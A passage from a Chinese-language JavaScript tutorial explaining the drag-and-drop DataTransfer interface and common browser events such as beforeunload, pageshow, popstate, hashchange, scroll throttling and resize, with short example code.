<span>DataTransfer 接口概述</span>\n        </h2>\n    <p>所有拖拉事件的实例都有一个<code>DragEvent.dataTransfer</code>属性，用来读写需要传递的数据。这个属性的值是一个<code>DataTransfer</code>接口的实例。</p>\n<p>浏览器原生提供一个<code>DataTransfer()</code>构造函数，用来生成<code>DataTransfer</code>实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var dataTrans = new DataTransfer();</code></pre><p><code>DataTransfer()</code>构造函数不接受参数。</p>\n<p>拖拉的数据分成两方面：数据的种类（又称格式）和数据的值。数据的种类是一个 MIME 字符串（比如<code>text/plain</code>、<code>image/jpeg</code>），数据的值是一个字符串。一般来说，如果拖拉一段文本，则数据默认就是那段文本；如果拖拉一个链接，则数据默认就是链接的 URL。</p>\n<p>拖拉事件开始时，开发者可以提供数据类型和数据值。拖拉过程中，开发者通过<code>dragenter</code>和<code>dragover</code>事件的监听函数，检查数据类型，以确定是否允许放下（drop）被拖拉的对象。比如，在只允许放下链接的区域，检查拖拉的数据类型是否为<code>text/uri-list</code>。</p>\n<p>发生<code>drop</code>事件时，监听函数取出拖拉的数据，对其进行处理。</p>\n\n        <h2>\n            <a href='#DataTransfer-的实例属性' class='header-anchor'>#</a>\n            <span>DataTransfer 的实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#DataTransfer.dropEffect' class='header-anchor'>#</a>\n            <span>DataTransfer.dropEffect</span>\n        </h3>\n    <p><code>DataTransfer.dropEffect</code>属性用来设置放下（drop）被拖拉节点时的效果，会影响到拖拉经过相关区域时鼠标的形状。它可能取下面的值。</p>\n<ul>\n<li>copy：复制被拖拉的节点</li>\n<li>move：移动被拖拉的节点</li>\n<li>link：创建指向被拖拉的节点的链接</li>\n<li>none：无法放下被拖拉的节点</li>\n</ul>\n<p>除了上面这些值，设置其他的值都是无效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>target.addEventListener(&#039;dragover&#039;, function (e) {\n  e.preventDefault();\n  e.stopPropagation();\n  e.dataTransfer.dropEffect = &#039;copy&#039;;\n});</code></pre><p>上面代码中，被拖拉元素一旦<code>drop</code>，接受的区域会复制该节点。</p>\n<p><code>dropEffect</code>属性一般在<code>dragenter</code>和<code>dragover</code>事件的监听函数中设置，对于<code>dragstart</code>、<code>drag</code>、<code>dragleave</code>这三个事件，该属性不起作用。因为该属性只对接受被拖拉的节点的区域有效，对被拖拉的节点本身是无效的。进入目标区域后，拖拉行为会初始化成设定的效果。</p>\n\n        <h3>\n            <a href='#DataTransfer.effectAllowed' class='header-anchor'>#</a>\n            <span>DataTransfer.effectAllowed</span>\n        </h3>\n    <p><code>DataTransfer.effectAllowed</code>属性设置本次拖拉中允许的效果。它可能取下面的值。</p>\n<ul>\n<li>copy：复制被拖拉的节点</li>\n<li>move：移动被拖拉的节点</li>\n<li>link：创建指向被拖拉节点的链接</li>\n<li>copyLink：允许<code>copy</code>或<code>link</code></li>\n<li>copyMove：允许<code>copy</code>或<code>move</code></li>\n<li>linkMove：允许<code>link</code>或<code>move</code></li>\n<li>all：允许所有效果</li>\n<li>none：无法放下被拖拉的节点</li>\n<li>uninitialized：默认值，等同于<code>all</code></li>\n</ul>\n<p>如果某种效果是不允许的，用户就无法在目标节点中达成这种效果。</p>\n<p>这个属性与<code>dropEffect</code>属性是同一件事的两个方面。前者设置被拖拉的节点允许的效果，后者设置接受拖拉的区域的效果，它们往往配合使用。</p>\n<p><code>dragstart</code>事件的监听函数，可以用来设置这个属性。其他事件的监听函数里面设置这个属性是无效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>source.addEventListener(&#039;dragstart&#039;, function (e) {\n  e.dataTransfer.effectAllowed = &#039;move&#039;;\n});\n\ntarget.addEventListener(&#039;dragover&#039;, function (e) {\n  ev.dataTransfer.dropEffect = &#039;move&#039;;\n});</code></pre><p>只要<code>dropEffect</code>属性和<code>effectAllowed</code>属性之中，有一个为<code>none</code>，就无法在目标节点上完成<code>drop</code>操作。</p>\n\n        <h3>\n            <a href='#DataTransfer.files' class='header-anchor'>#</a>\n            <span>DataTransfer.files</span>\n        </h3>\n    <p><code>DataTransfer.files</code>属性是一个 FileList 对象，包含一组本地文件，可以用来在拖拉操作中传送。如果本次拖拉不涉及文件，则该属性为空的 FileList 对象。</p>\n<p>下面就是一个接收拖拉文件的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;output&quot; style=&quot;min-height: 200px;border: 1px solid black;&quot;&gt;\n//   文件拖拉到这里\n// &lt;/div&gt;\n\nvar div = document.getElementById(&#039;output&#039;);\n\ndiv.addEventListener(&quot;dragenter&quot;, function( event ) {\n  div.textContent = &#039;&#039;;\n  event.stopPropagation();\n  event.preventDefault();\n}, false);\n\ndiv.addEventListener(&quot;dragover&quot;, function( event ) {\n  event.stopPropagation();\n  event.preventDefault();\n}, false);\n\ndiv.addEventListener(&quot;drop&quot;, function( event ) {\n  event.stopPropagation();\n  event.preventDefault();\n  var files = event.dataTransfer.files;\n  for (var i = 0; i &lt; files.length; i++) {\n    div.textContent += files[i].name + &#039; &#039; + files[i].size + &#039;字节\\n&#039;;\n  }\n}, false);</code></pre><p>上面代码中，通过<code>dataTransfer.files</code>属性读取被拖拉的文件的信息。如果想要读取文件内容，就要使用<code>FileReader</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;drop&#039;, function(e) {\n  e.preventDefault();\n  e.stopPropagation();\n\n  var fileList = e.dataTransfer.files;\n  if (fileList.length &gt; 0) {\n    var file = fileList[0];\n    var reader = new FileReader();\n    reader.onloadend = function(e) {\n      if (e.target.readyState === FileReader.DONE) {\n        var content = reader.result;\n        div.innerHTML = &#039;File: &#039; + file.name + &#039;\\n\\n&#039; + content;\n      }\n    }\n    reader.readAsBinaryString(file);\n  }\n});</code></pre>\n        <h3>\n            <a href='#DataTransfer.types' class='header-anchor'>#</a>\n            <span>DataTransfer.types</span>\n        </h3>\n    <p><code>DataTransfer.types</code>属性是一个只读的数组，每个成员是一个字符串，里面是拖拉的数据格式（通常是 MIME 值）。比如，如果拖拉的是文字，对应的成员就是<code>text/plain</code>。</p>\n<p>下面是一个例子，通过检查<code>dataTransfer</code>属性的类型，决定是否允许在当前节点执行<code>drop</code>操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>function contains(list, value){\n  for (var i = 0; i &lt; list.length; ++i) {\n    if(list[i] === value) return true;\n  }\n  return false;\n}\n\nfunction doDragOver(event) {\n  var isLink = contains(event.dataTransfer.types, &#039;text/uri-list&#039;);\n  if (isLink) event.preventDefault();\n}</code></pre><p>上面代码中，只有当被拖拉的节点是一个链接时，才允许在当前节点放下。</p>\n\n        <h3>\n            <a href='#DataTransfer.items' class='header-anchor'>#</a>\n            <span>DataTransfer.items</span>\n        </h3>\n    <p><code>DataTransfer.items</code>属性返回一个类似数组的只读对象（DataTransferItemList 实例），每个成员就是本次拖拉的一个对象（DataTransferItem 实例）。如果本次拖拉不包含对象，则返回一个空对象。</p>\n<p>DataTransferItemList 实例具有以下的属性和方法。</p>\n<ul>\n<li><code>length</code>：返回成员的数量</li>\n<li><code>add(data, type)</code>：增加一个指定内容和类型（比如<code>text/html</code>和<code>text/plain</code>）的字符串作为成员</li>\n<li><code>add(file)</code>：<code>add</code>方法的另一种用法，增加一个文件作为成员</li>\n<li><code>remove(index)</code>：移除指定位置的成员</li>\n<li><code>clear()</code>：移除所有的成员</li>\n</ul>\n<p>DataTransferItem 实例具有以下的属性和方法。</p>\n<ul>\n<li><code>kind</code>：返回成员的种类（<code>string</code>还是<code>file</code>）。</li>\n<li><code>type</code>：返回成员的类型（通常是 MIME 值）。</li>\n<li><code>getAsFile()</code>：如果被拖拉是文件，返回该文件，否则返回<code>null</code>。</li>\n<li><code>getAsString(callback)</code>：如果被拖拉的是字符串，将该字符传入指定的回调函数处理。该方法是异步的，所以需要传入回调函数。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;drop&#039;, function (e) {\n  e.preventDefault();\n  if (e.dataTransfer.items != null) {\n    for (var i = 0; i &lt; e.dataTransfer.items.length; i++) {\n      console.log(e.dataTransfer.items[i].kind + &#039;: &#039; + e.dataTransfer.items[i].type);\n    }\n  }\n});</code></pre>\n        <h2>\n            <a href='#DataTransfer-的实例方法' class='header-anchor'>#</a>\n            <span>DataTransfer 的实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#DataTransfer.setData()' class='header-anchor'>#</a>\n            <span>DataTransfer.setData()</span>\n        </h3>\n    <p><code>DataTransfer.setData()</code>方法用来设置拖拉事件所带有的数据。该方法没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>event.dataTransfer.setData(&#039;text/plain&#039;, &#039;Text to drag&#039;);</code></pre><p>上面代码为当前的拖拉事件加入纯文本数据。</p>\n<p>该方法接受两个参数，都是字符串。第一个参数表示数据类型（比如<code>text/plain</code>），第二个参数是具体数据。如果指定类型的数据在<code>dataTransfer</code>属性不存在，那么这些数据将被加入，否则原有的数据将被新数据替换。</p>\n<p>如果是拖拉文本框或者拖拉选中的文本，会默认将对应的文本数据，添加到<code>dataTransfer</code>属性，不用手动指定。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div draggable=&quot;true&quot;&gt;\n  aaa\n&lt;/div&gt;</code></pre><p>上面代码中，拖拉这个<code>&lt;div&gt;</code>元素会自动带上文本数据<code>aaa</code>。</p>\n<p>使用<code>setData</code>方法，可以替换到原有数据。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div\n  draggable=&quot;true&quot;\n  ondragstart=&quot;event.dataTransfer.setData(&#039;text/plain&#039;, &#039;bbb&#039;)&quot;\n&gt;\n  aaa\n&lt;/div&gt;</code></pre><p>上面代码中，拖拉数据实际上是<code>bbb</code>，而不是<code>aaa</code>。</p>\n<p>下面是添加其他类型的数据。由于<code>text/plain</code>是最普遍支持的格式，为了保证兼容性，建议最后总是保存一份纯文本格式的数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var dt = event.dataTransfer;\n\n// 添加链接\ndt.setData(&#039;text/uri-list&#039;, &#039;http://www.example.com&#039;);\ndt.setData(&#039;text/plain&#039;, &#039;http://www.example.com&#039;);\n\n// 添加 HTML 代码\ndt.setData(&#039;text/html&#039;, &#039;Hello there, &lt;strong&gt;stranger&lt;/strong&gt;&#039;);\ndt.setData(&#039;text/plain&#039;, &#039;Hello there, &lt;strong&gt;stranger&lt;/strong&gt;&#039;);\n\n// 添加图像的 URL\ndt.setData(&#039;text/uri-list&#039;, imageurl);\ndt.setData(&#039;text/plain&#039;, imageurl);</code></pre><p>可以一次提供多种格式的数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var dt = event.dataTransfer;\ndt.setData(&#039;application/x-bookmark&#039;, bookmarkString);\ndt.setData(&#039;text/uri-list&#039;, &#039;http://www.example.com&#039;);\ndt.setData(&#039;text/plain&#039;, &#039;http://www.example.com&#039;);</code></pre><p>上面代码中，通过在同一个事件上面，存放三种类型的数据，使得拖拉事件可以在不同的对象上面，<code>drop</code>不同的值。注意，第一种格式是一个自定义格式，浏览器默认无法读取，这意味着，只有某个部署了特定代码的节点，才可能<code>drop</code>（读取到）这个数据。</p>\n\n        <h3>\n            <a href='#DataTransfer.getData()' class='header-anchor'>#</a>\n            <span>DataTransfer.getData()</span>\n        </h3>\n    <p><code>DataTransfer.getData()</code>方法接受一个字符串（表示数据类型）作为参数，返回事件所带的指定类型的数据（通常是用<code>setData</code>方法添加的数据）。如果指定类型的数据不存在，则返回空字符串。通常只有<code>drop</code>事件触发后，才能取出数据。</p>\n<p>下面是一个<code>drop</code>事件的监听函数，用来取出指定类型的数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>function onDrop(event) {\n  var data = event.dataTransfer.getData(&#039;text/plain&#039;);\n  event.target.textContent = data;\n  event.preventDefault();\n}</code></pre><p>上面代码取出拖拉事件的文本数据，将其替换成当前节点的文本内容。注意，这时还必须取消浏览器的默认行为，因为假如用户拖拉的是一个链接，浏览器默认会在当前窗口打开这个链接。</p>\n<p><code>getData</code>方法返回的是一个字符串，如果其中包含多项数据，就必须手动解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doDrop(event) {\n  var lines = event.dataTransfer.getData(&#039;text/uri-list&#039;).split(&#039;\\n&#039;);\n  for (let line of lines) {\n    let link = document.createElement(&#039;a&#039;);\n    link.href = line;\n    link.textContent = line;\n    event.target.appendChild(link);\n  }\n  event.preventDefault();\n}</code></pre><p>上面代码中，<code>getData</code>方法返回的是一组链接，就必须自行解析。</p>\n<p>类型值指定为<code>URL</code>，可以取出第一个有效链接。</p>\n<pre class=\"prettyprint language-javascript\"><code>var link = event.dataTransfer.getData(&#039;URL&#039;);</code></pre><p>下面的例子是从多种类型的数据里面取出数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doDrop(event) {\n  var types = event.dataTransfer.types;\n  var supportedTypes = [&#039;text/uri-list&#039;, &#039;text/plain&#039;];\n  types = supportedTypes.filter(function (value) { types.includes(value) });\n  if (types.length) {\n    var data = event.dataTransfer.getData(types[0]);\n  }\n  event.preventDefault();\n}</code></pre>\n        <h3>\n            <a href='#DataTransfer.clearData()' class='header-anchor'>#</a>\n            <span>DataTransfer.clearData()</span>\n        </h3>\n    <p><code>DataTransfer.clearData()</code>方法接受一个字符串（表示数据类型）作为参数，删除事件所带的指定类型的数据。如果没有指定类型，则删除所有数据。如果指定类型不存在，则调用该方法不会产生任何效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>event.dataTransfer.clearData(&#039;text/uri-list&#039;);</code></pre><p>上面代码清除事件所带的<code>text/uri-list</code>类型的数据。</p>\n<p>该方法不会移除拖拉的文件，因此调用该方法后，<code>DataTransfer.types</code>属性可能依然会返回<code>Files</code>类型（前提是存在文件拖拉）。</p>\n<p>注意，该方法只能在<code>dragstart</code>事件的监听函数之中使用，因为这是拖拉操作的数据唯一可写的时机。</p>\n\n        <h3>\n            <a href='#DataTransfer.setDragImage()' class='header-anchor'>#</a>\n            <span>DataTransfer.setDragImage()</span>\n        </h3>\n    <p>拖动过程中（<code>dragstart</code>事件触发后），浏览器会显示一张图片跟随鼠标一起移动，表示被拖动的节点。这张图片是自动创造的，通常显示为被拖动节点的外观，不需要自己动手设置。</p>\n<p><code>DataTransfer.setDragImage()</code>方法可以自定义这张图片。它接受三个参数。第一个是<code>&lt;img&gt;</code>节点或者<code>&lt;canvas&gt;</code>节点，如果省略或为<code>null</code>，则使用被拖动的节点的外观；第二个和第三个参数为鼠标相对于该图片左上角的横坐标和右坐标。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n &lt;div id=&quot;drag-with-image&quot; class=&quot;dragdemo&quot; draggable=&quot;true&quot;&gt;\n   drag me\n &lt;/div&gt;\n*/\n\nvar div = document.getElementById(&#039;drag-with-image&#039;);\ndiv.addEventListener(&#039;dragstart&#039;, function (e) {\n  var img = document.createElement(&#039;img&#039;);\n  img.src = &#039;http://path/to/img&#039;;\n  e.dataTransfer.setDragImage(img, 0, 0);\n}, false);</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"其他常见事件","link":"/events/common.html"}],"content":"\n        <h1>\n            <a href='#其他常见事件' class='header-anchor'>#</a>\n            <span>其他常见事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#资源事件' class='header-anchor'>#</a>\n            <span>资源事件</span>\n        </h2>\n    \n        <h3>\n            <a href='#beforeunload-事件' class='header-anchor'>#</a>\n            <span>beforeunload 事件</span>\n        </h3>\n    <p><code>beforeunload</code>事件在窗口、文档、各种资源将要卸载前触发。它可以用来防止用户不小心卸载资源。</p>\n<p>如果该事件对象的<code>returnValue</code>属性是一个非空字符串，那么浏览器就会弹出一个对话框，询问用户是否要卸载该资源。但是，用户指定的字符串可能无法显示，浏览器会展示预定义的字符串。如果用户点击“取消”按钮，资源就不会卸载。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;beforeunload&#039;, function(event) {\n  event.returnValue = &#039;你确定离开吗？&#039;;\n});</code></pre><p>上面代码中，用户如果关闭窗口，浏览器会弹出一个窗口，要求用户确认。</p>\n<p>浏览器对这个事件的行为很不一致，有的浏览器调用<code>event.preventDefault()</code>，也会弹出对话框。IE 浏览器需要显式返回一个非空的字符串，才会弹出对话框。而且，大多数浏览器在对话框中不显示指定文本，只显示默认文本。因此，可以采用下面的写法，取得最大的兼容性。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;beforeunload&#039;, function(e) {\n  var confirmationMessage = &#039;确认关闭窗口？&#039;;\n\n  e.returnValue = confirmationMessage;\n  return confirmationMessage;\n});</code></pre><p>注意，许多手机浏览器默认忽略这个事件，桌面浏览器也有办法忽略这个事件。所以，它可能根本不会生效，不能依赖它来阻止用户关闭窗口。</p>\n<p>另外，一旦使用了<code>beforeunload</code>事件，浏览器就不会缓存当前网页。因为执行了这个事件以后，缓存页面就没意义了。</p>\n\n        <h3>\n            <a href='#unload-事件' class='header-anchor'>#</a>\n            <span>unload 事件</span>\n        </h3>\n    <p><code>unload</code>事件在窗口关闭或者<code>document</code>对象将要卸载时触发。它的触发顺序排在<code>beforeunload</code>、<code>pagehide</code>事件后面。</p>\n<p><code>unload</code>事件发生时，文档处于一个特殊状态。所有资源依然存在，但是对用户来说都不可见，UI 互动全部无效。这个事件是无法取消的，即使在监听函数里面抛出错误，也不能停止文档的卸载。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;unload&#039;, function(event) {\n  console.log(&#039;文档将要卸载&#039;);\n});</code></pre><p>跟<code>beforeunload</code>事件一样，一旦使用了<code>unload</code>事件，浏览器就不会缓存当前网页，理由同上。</p>\n\n        <h3>\n            <a href='#load-事件，error-事件' class='header-anchor'>#</a>\n            <span>load 事件，error 事件</span>\n        </h3>\n    <p><code>load</code>事件在页面或某个资源加载成功时触发。注意，页面或资源从浏览器缓存加载，并不会触发<code>load</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;load&#039;, function(event) {\n  console.log(&#039;所有资源都加载完成&#039;);\n});</code></pre><p><code>error</code>事件是在页面或资源加载失败时触发。<code>abort</code>事件在用户取消加载时触发。</p>\n<p>这三个事件实际上属于进度事件，不仅发生在<code>document</code>对象，还发生在各种外部资源上面。浏览网页就是一个加载各种资源的过程，图像（image）、样式表（style sheet）、脚本（script）、视频（video）、音频（audio）、Ajax请求（XMLHttpRequest）等等。这些资源和<code>document</code>对象、<code>window</code>对象、XMLHttpRequestUpload 对象，都会触发<code>load</code>事件和<code>error</code>事件。</p>\n\n        <h2>\n            <a href='#session-历史事件' class='header-anchor'>#</a>\n            <span>session 历史事件</span>\n        </h2>\n    \n        <h3>\n            <a href='#pageshow-事件，pagehide-事件' class='header-anchor'>#</a>\n            <span>pageshow 事件，pagehide 事件</span>\n        </h3>\n    <p>默认情况下，浏览器会在当前会话（session）缓存页面，当用户点击“前进/后退”按钮时，浏览器就会从缓存中加载页面。</p>\n<p>pageshow 事件在页面加载时触发，包括第一次加载和从缓存加载两种情况。如果要指定页面每次加载（不管是不是从浏览器缓存）时都运行的代码，可以放在这个事件的监听函数。</p>\n<p>第一次加载时，它的触发顺序排在<code>load</code>事件后面。从缓存加载时，<code>load</code>事件不会触发，因为网页在缓存中的样子通常是<code>load</code>事件的监听函数运行后的样子，所以不必重复执行。同理，如果是从缓存中加载页面，网页内初始化的 JavaScript 脚本（比如 DOMContentLoaded 事件的监听函数）也不会执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;pageshow&#039;, function(event) {\n  console.log(&#039;pageshow: &#039;, event);\n});</code></pre><p>pageshow 事件有一个<code>persisted</code>属性，返回一个布尔值。页面第一次加载时，这个属性是<code>false</code>；当页面从缓存加载时，这个属性是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;pageshow&#039;, function(event){\n  if (event.persisted) {\n    // ...\n  }\n});</code></pre><p><code>pagehide</code>事件与<code>pageshow</code>事件类似，当用户通过“前进/后退”按钮，离开当前页面时触发。它与 unload 事件的区别在于，如果在 window 对象上定义<code>unload</code>事件的监听函数之后，页面不会保存在缓存中，而使用<code>pagehide</code>事件，页面会保存在缓存中。</p>\n<p><code>pagehide</code>事件实例也有一个<code>persisted</code>属性，将这个属性设为<code>true</code>，就表示页面要保存在缓存中；设为<code>false</code>，表示网页不保存在缓存中，这时如果设置了unload 事件的监听函数，该函数将在 pagehide 事件后立即运行。</p>\n<p>如果页面包含<code>&lt;frame&gt;</code>或<code>&lt;iframe&gt;</code>元素，则<code>&lt;frame&gt;</code>页面的<code>pageshow</code>事件和<code>pagehide</code>事件，都会在主页面之前触发。</p>\n\n        <h3>\n            <a href='#popstate-事件' class='header-anchor'>#</a>\n            <span>popstate 事件</span>\n        </h3>\n    <p><code>popstate</code>事件在浏览器的<code>history</code>对象的当前记录发生显式切换时触发。注意，调用<code>history.pushState()</code>或<code>history.replaceState()</code>，并不会触发<code>popstate</code>事件。该事件只在用户在<code>history</code>记录之间显式切换时触发，比如鼠标点击“后退/前进”按钮，或者在脚本中调用<code>history.back()</code>、<code>history.forward()</code>、<code>history.go()</code>时触发。</p>\n<p>该事件对象有一个<code>state</code>属性，保存<code>history.pushState</code>方法和<code>history.replaceState</code>方法为当前记录添加的<code>state</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onpopstate = function (event) {\n  console.log(&#039;state: &#039; + event.state);\n};\nhistory.pushState({page: 1}, &#039;title 1&#039;, &#039;?page=1&#039;);\nhistory.pushState({page: 2}, &#039;title 2&#039;, &#039;?page=2&#039;);\nhistory.replaceState({page: 3}, &#039;title 3&#039;, &#039;?page=3&#039;);\nhistory.back(); // state: {&quot;page&quot;:1}\nhistory.back(); // state: null\nhistory.go(2);  // state: {&quot;page&quot;:3}</code></pre><p>上面代码中，<code>pushState</code>方法向<code>history</code>添加了两条记录，然后<code>replaceState</code>方法替换掉当前记录。因此，连续两次<code>back</code>方法，会让当前条目退回到原始网址，它没有附带<code>state</code>对象，所以事件的<code>state</code>属性为<code>null</code>，然后前进两条记录，又回到<code>replaceState</code>方法添加的记录。</p>\n<p>浏览器对于页面首次加载，是否触发<code>popstate</code>事件，处理不一样，Firefox 不触发该事件。</p>\n\n        <h3>\n            <a href='#hashchange-事件' class='header-anchor'>#</a>\n            <span>hashchange 事件</span>\n        </h3>\n    <p><code>hashchange</code>事件在 URL 的 hash 部分（即<code>#</code>号后面的部分，包括<code>#</code>号）发生变化时触发。该事件一般在<code>window</code>对象上监听。</p>\n<p><code>hashchange</code>的事件实例具有两个特有属性：<code>oldURL</code>属性和<code>newURL</code>属性，分别表示变化前后的完整 URL。</p>\n<pre class=\"prettyprint language-javascript\"><code>// URL 是 http://www.example.com/\nwindow.addEventListener(&#039;hashchange&#039;, myFunction);\n\nfunction myFunction(e) {\n  console.log(e.oldURL);\n  console.log(e.newURL);\n}\n\nlocation.hash = &#039;part2&#039;;\n// http://www.example.com/\n// http://www.example.com/#part2</code></pre>\n        <h2>\n            <a href='#网页状态事件' class='header-anchor'>#</a>\n            <span>网页状态事件</span>\n        </h2>\n    \n        <h3>\n            <a href='#DOMContentLoaded-事件' class='header-anchor'>#</a>\n            <span>DOMContentLoaded 事件</span>\n        </h3>\n    <p>网页下载并解析完成以后，浏览器就会在<code>document</code>对象上触发 DOMContentLoaded 事件。这时，仅仅完成了网页的解析（整张页面的 DOM 生成了），所有外部资源（样式表、脚本、iframe 等等）可能还没有下载结束。也就是说，这个事件比<code>load</code>事件，发生时间早得多。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.addEventListener(&#039;DOMContentLoaded&#039;, function (event) {\n  console.log(&#039;DOM生成&#039;);\n});</code></pre><p>注意，网页的 JavaScript 脚本是同步执行的，脚本一旦发生堵塞，将推迟触发<code>DOMContentLoaded</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.addEventListener(&#039;DOMContentLoaded&#039;, function (event) {\n  console.log(&#039;DOM 生成&#039;);\n});\n\n// 这段代码会推迟触发 DOMContentLoaded 事件\nfor(var i = 0; i &lt; 1000000000; i++) {\n  // ...\n}</code></pre>\n        <h3>\n            <a href='#readystatechange-事件' class='header-anchor'>#</a>\n            <span>readystatechange 事件</span>\n        </h3>\n    <p><code>readystatechange</code>事件当 Document 对象和 XMLHttpRequest 对象的<code>readyState</code>属性发生变化时触发。<code>document.readyState</code>有三个可能的值：<code>loading</code>（网页正在加载）、<code>interactive</code>（网页已经解析完成，但是外部资源仍然处在加载状态）和<code>complete</code>（网页和所有外部资源已经结束加载，<code>load</code>事件即将触发）。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.onreadystatechange = function () {\n  if (document.readyState === &#039;interactive&#039;) {\n    // ...\n  }\n}</code></pre><p>这个事件可以看作<code>DOMContentLoaded</code>事件的另一种实现方法。</p>\n\n        <h2>\n            <a href='#窗口事件' class='header-anchor'>#</a>\n            <span>窗口事件</span>\n        </h2>\n    \n        <h3>\n            <a href='#scroll-事件' class='header-anchor'>#</a>\n            <span>scroll 事件</span>\n        </h3>\n    <p><code>scroll</code>事件在文档或文档元素滚动时触发，主要出现在用户拖动滚动条。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;scroll&#039;, callback);</code></pre><p>该事件会连续地大量触发，所以它的监听函数之中不应该有非常耗费计算的操作。推荐的做法是使用<code>requestAnimationFrame</code>或<code>setTimeout</code>控制该事件的触发频率，然后可以结合<code>customEvent</code>抛出一个新事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function () {\n  var throttle = function (type, name, obj) {\n    var obj = obj || window;\n    var running = false;\n    var func = function () {\n      if (running) { return; }\n      running = true;\n      requestAnimationFrame(function() {\n        obj.dispatchEvent(new CustomEvent(name));\n        running = false;\n      });\n    };\n    obj.addEventListener(type, func);\n  };\n\n  // 将 scroll 事件重定义为 optimizedScroll 事件\n  throttle(&#039;scroll&#039;, &#039;optimizedScroll&#039;);\n})();\n\nwindow.addEventListener(&#039;optimizedScroll&#039;, function() {\n  console.log(&#039;Resource conscious scroll callback!&#039;);\n});</code></pre><p>上面代码中，<code>throttle</code>函数用于控制事件触发频率，<code>requestAnimationFrame</code>方法保证每次页面重绘（每秒60次），只会触发一次<code>scroll</code>事件的监听函数。也就是说，上面方法将<code>scroll</code>事件的触发频率，限制在每秒60次。具体来说，就是<code>scroll</code>事件只要频率低于每秒60次，就会触发<code>optimizedScroll</code>事件，从而执行<code>optimizedScroll</code>事件的监听函数。</p>\n<p>改用<code>setTimeout</code>方法，可以放置更大的时间间隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function() {\n  window.addEventListener(&#039;scroll&#039;, scrollThrottler, false);\n\n  var scrollTimeout;\n  function scrollThrottler() {\n    if (!scrollTimeout) {\n      scrollTimeout = setTimeout(function () {\n        scrollTimeout = null;\n        actualScrollHandler();\n      }, 66);\n    }\n  }\n\n  function actualScrollHandler() {\n    // ...\n  }\n}());</code></pre><p>上面代码中，每次<code>scroll</code>事件都会执行<code>scrollThrottler</code>函数。该函数里面有一个定时器<code>setTimeout</code>，每66毫秒触发一次（每秒15次）真正执行的任务<code>actualScrollHandler</code>。</p>\n<p>下面是一个更一般的<code>throttle</code>函数的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function throttle(fn, wait) {\n  var time = Date.now();\n  return function() {\n    if ((time + wait - Date.now()) &lt; 0) {\n      fn();\n      time = Date.now();\n    }\n  }\n}\n\nwindow.addEventListener(&#039;scroll&#039;, throttle(callback, 1000));</code></pre><p>上面的代码将<code>scroll</code>事件的触发频率，限制在一秒一次。</p>\n<p><code>lodash</code>函数库提供了现成的<code>throttle</code>函数，可以直接使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;scroll&#039;, _.throttle(callback, 1000));</code></pre>\n        <h3>\n            <a href='#resize-事件' class='header-anchor'>#</a>\n            <span>resize 事件</span>\n        </h3>\n    <p><code>resize</code>事件在改变浏览器窗口大小时触发，主要发生在<code>window</code>对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>var resizeMethod = function () {\n  if (document.body.clientWidth &lt; 768) {\n    console.log(&#039;移动设备的视口&#039;);\n  }\n};\n\nwindow.addEventListener(&#039;resize&#039;, resizeMethod, true);</code></pre><p>该事件也会连续地大量触发，所以最好像上面的<code>scroll</code>事件一样，通过<code>throttle</code>函数控制事件触发频率。</p>\n\n        <h3>\n            <a href='#fullscreenchange-事件，fullscreenerror-事件' class='header-anchor'>#</a>\n            <span>fullscreenchange 事件，fullscreenerror 事件</span>\n        </h3>\n    <p><code>fullscreenchange</code>事件在进入或推出全屏状态时触发，该事件发生在<code>document</code>对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.addEventListener(&#039;fullscreenchange&#039;, function (event) {\n  console.log(document.fullscreenElement);\n});</code></pre><p><code>fullscreenerror</code>事件在浏览器无法切换到全屏状态时触发。</p>\n\n        <h2>\n            <a href='#剪贴板事件' class='header-anchor'>#</a>\n            <span>剪贴板事件</span>\n        </h2>\n    <p>以下三个事件属于剪贴板操作的相关事件。</p>\n<ul>\n<li><code>cut</code>：将选中的内容从文档中移除，加入剪贴板时触发。</li>\n<li><code>copy</code>：进行复制动作时触发。</li>\n<li><code>paste</code>：剪贴板内容粘贴到文档后触发。</li>\n</ul>\n<p>这三个事件都是<code>ClipboardEvent</code>接口的实例。<code>ClipboardEvent</code>有一个实例属性<code>clipboardData</code>，是一个 DataTransfer 